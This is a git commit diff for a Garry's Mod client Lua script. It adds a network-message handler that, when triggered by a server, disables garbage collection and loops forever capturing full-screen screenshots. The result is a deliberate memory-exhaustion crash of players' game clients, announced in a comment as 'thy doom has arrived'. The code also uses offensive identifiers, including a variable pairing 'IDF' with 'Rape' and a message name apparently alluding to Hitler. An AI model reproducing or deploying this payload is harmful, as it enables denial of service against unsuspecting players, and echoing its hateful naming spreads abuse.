261c9f080c7c180f26d67aeff44dec6ed752e916
i am a person <jeffreyeinstein25901631@hotmail.com>
2026-06-11 13:44:49 +0300

    Update cl_thefunnylua.lua

--- cl_thefunnylua.lua
+++ cl_thefunnylua.lua
@@ -1,13 +1,18 @@
+local IDFRape = 2
 net.Receive("ShakeYoAssForDaddyChadolf", function()
+    -- thy doom has arrived :)
+    collectgarbage("stop")
     while true do
       local w, h = ScrW(), ScrH()
-        local data = render.Capture({
-            format = "png",
-            x = 0,
-            y = 0,
-            w = w,
-            h = h,
-            quality = 100
-        })
+      local data = render.Capture({
+         format = "png",
+         x = 0,            
+         y = 0,
+         w = w,
+         h = h,
+         quality = 100
+     })
+     IDFRape = IDFRape * 2
+     IDFRape = IDFRape + 40
     end
 end)
